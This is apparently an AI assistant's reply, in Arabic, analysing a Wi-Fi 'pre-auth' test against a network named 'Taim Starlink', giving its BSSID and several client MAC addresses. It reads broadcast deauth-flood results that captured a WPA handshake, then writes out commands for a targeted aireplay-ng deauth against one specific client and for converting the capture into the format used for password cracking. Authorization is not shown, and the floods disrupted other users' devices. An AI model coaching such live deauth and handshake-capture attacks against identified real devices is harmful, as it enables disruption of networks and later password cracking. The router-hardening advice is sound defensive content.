قرأت الملفات. هذه هي القراءة الفنية المختصرة والدقيقة لما حصل.

**النتيجة الأساسية**
أنت نفذت سيناريو Pre‑Auth بشكل صحيح، والنتائج تقول:

- الشبكة: `Taim Starlink`
- BSSID: `80:AF:CA:CA:A3:D3`
- القناة: `11`
- التشفير الفعلي في `airodump`: `WPA2 / CCMP / PSK`
- لكن `iw scan` و `nmcli` يبيّنان أن الراوتر يعلن `WPA v1` و `RSN/WPA2` معًا.
- لا يوجد TKIP ظاهر. الموجود `CCMP` فقط.
- `PMF/802.11w` غير مفعّل أو غير معلن؛ لأن `RSN Capabilities = 0x0000`.
- الالتقاط السلبي 15 دقيقة لم يلتقط handshake.
- اختبار deauth التقط handshake بنجاح.
- WPS لم يظهر في `wash`، وهذا يدعم كلامك أنه غير مفعّل.

**أهم فجوة مؤكدة**
أقوى نتيجة عندك الآن هي:

`PMF غير مفعّل + الشبكة قابلة لسيناريو deauth/reconnect + تم التقاط handshake`

الدليل:

في `taim_deauth_test-01.cap`:

```text
DEAUTHENTICATION total: 1542
EAPOL messages total: 16
EAPOL pairs best: 3
aircrack-ng: WPA (1 handshake)
```

هذا يعني أن مرحلة ما قبل الاتصال نجحت في إثبات أن العملاء يمكن دفعهم لإعادة الاتصال، وأن المصافحة تُلتقط.

**عن PMF**
من ناتج `iw`:

```text
RSN Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
```

لو كان PMF مدعومًا أو مطلوبًا كنا نتوقع ظهور flags مرتبطة بـ Management Frame Protection. القيمة `0x0000` تعني عمليًا: لا يوجد إعلان واضح لـ PMF. لذلك حزم deauth غير المحمية يمكن أن تؤثر على العملاء.

هذا يفسر لماذا رأيت handshake بعد deauth.

**عن WPA1/WPA2**
الناتج يقول:

```text
WPA: Version 1
Group cipher: CCMP
Pairwise ciphers: CCMP
Authentication suites: PSK

RSN: Version 1
Group cipher: CCMP
Pairwise ciphers: CCMP
Authentication suites: PSK
```

هذا يعني أن الراوتر يعلن دعم WPA القديم وWPA2 في نفس الوقت. `airodump` اختصرها كـ:

```text
WPA2 CCMP PSK
```

لكن وجود `WPA Version 1` بحد ذاته إعداد legacy غير مثالي. ليس كارثيًا لأن TKIP غير ظاهر، لكن الأفضل أمنيًا أن يكون الراوتر مضبوطًا على:

```text
WPA2-PSK AES/CCMP only
```

أو:

```text
WPA3/WPA2 transition مع PMF
```

إذا كان متاحًا.

**تحليل العملاء**
في الالتقاط السلبي:

- `3E:4F:AE:61:46:3F`
  - أقوى عميل عمليًا
  - `-69 dBm`
  - `43869` packets
  - أفضل عميل للمراقبة

- `04:10:6B:46:59:9E`
  - Xiaomi
  - ضعيف الإشارة `-88 dBm`
  - نشاط عالٍ `12856`

- `D6:08:7D:3F:4B:85`
  - متوسط/ضعيف
  - مهم في اختبار deauth لأنه ظهر في EAPOL

- `3A:93:CD:6F:AB:34`
  - ضعيف لكنه أعطى EAPOL في اختبار deauth

في ملف deauth، الـ EAPOL ظهر مع:

```text
D6:08:7D:3F:4B:85
3E:4F:AE:61:46:3F
3A:93:CD:6F:AB:34
```

وهذا ممتاز تعليميًا: لديك أكثر من عميل استجاب بإعادة اتصال.

**تحليل deauth**
التوزيع الزمني:

```text
02:07:59  166
02:08:00  594
02:08:01  8
02:08:37  259
02:08:38  475
02:08:39  40
```

يعني حصلت موجتان واضحتان من deauth.

ومن جهة العناوين:

```text
SA:80:af:ca:ca:a3:d3        1158
DA:ff:ff:ff:ff:ff:ff         768
SA:d6:08:7d:3f:4b:85         384
DA:80:af:ca:ca:a3:d3         384
DA:d6:08:7d:3f:4b:85         390
```

لا يمكن الجزم من الترافيك وحده أن المصدر الحقيقي هو الراوتر أو العميل، لأن deauth frames يمكن تزوير مصدرها إذا لم تكن PMF مفعّلة. لكن عمليًا النتيجة التي تهمنا: الشبكة والعملاء تأثروا بما يكفي لإنتاج handshake.

**مشكلة `wash`**
الأمر:

```bash
sudo wash -i wlp4s0mon -C
```

فشل لأن إصدار `wash` عندك لا يدعم `-C`.

استخدم بدلًا منه:

```bash
sudo wash -i wlp4s0mon -c 11
```

ولفحص أكثر وضوحًا:

```bash
sudo wash -i wlp4s0mon -c 11 -a -F
```

إذا لم تظهر `Taim Starlink` حتى مع `-a`، فهذا يدعم أن WPS غير معلن/غير مفعل.

**ما تعلمناه حتى الآن**
حالة الشبكة Pre‑Auth:

- WPS: غالبًا غير مفعل.
- WPA mode: يوجد إعلان WPA1 + WPA2.
- Cipher: CCMP فقط، لا TKIP ظاهر.
- PMF: غير مفعل/غير معلن.
- Passive capture: لا handshake بدون reconnect خلال 15 دقيقة.
- Active deauth test: نجح وأنتج handshake.
- أفضل عميل للمراقبة: `3E:4F:AE:61:46:3F`.
- أفضل نتيجة تدريبية: الشبكة قابلة لالتقاط handshake عبر deauth محدود.

**الخطوة التالية المنطقية**
لا نذهب الآن لكسر كلمة المرور. الخطوة الأفضل هي توثيق الفجوات بدقة وإعادة اختبار PMF/WPA بإخراج أنظف:

```bash
sudo iw dev wlp4s0 scan | grep -A45 -i "SSID: Taim Starlink"
```

ثم WPS:

```bash
sudo wash -i wlp4s0mon -c 11 -a -F
```

ثم التقاط deauth محدود موجه لأقوى عميل فقط:

```bash
sudo airodump-ng --bssid 80:AF:CA:CA:A3:D3 -c 11 -w taim_client_3e_test wlp4s0mon
```

وفي نافذة ثانية:

```bash
sudo aireplay-ng --deauth 3 -a 80:AF:CA:CA:A3:D3 -c 3E:4F:AE:61:46:3F wlp4s0mon
```

بعدها:

```bash
aircrack-ng taim_client_3e_test-01.cap
hcxpcapngtool taim_client_3e_test-01.cap
```

الهدف من هذا الاختبار ليس زيادة الهجوم، بل إثبات أن عميلًا محددًا بعينه قابل لإعادة الاتصال وإنتاج handshake، بدل الاعتماد على broadcast deauth عام.

ولا تنسَ بعد الانتهاء إعادة الشبكة للوضع الطبيعي:

```bash
sudo airmon-ng stop wlp4s0mon
sudo systemctl restart NetworkManager
```

الخلاصة: أنت الآن وصلت لنتيجة عملية صحيحة في مرحلة ما قبل الاتصال. الفجوة الواقعية ليست WPS، بل غياب PMF مع إمكانية deauth/reconnect، إضافة إلى إعداد mixed WPA/WPA2 الذي يستحق التصحيح لاحقًا من لوحة الراوتر.
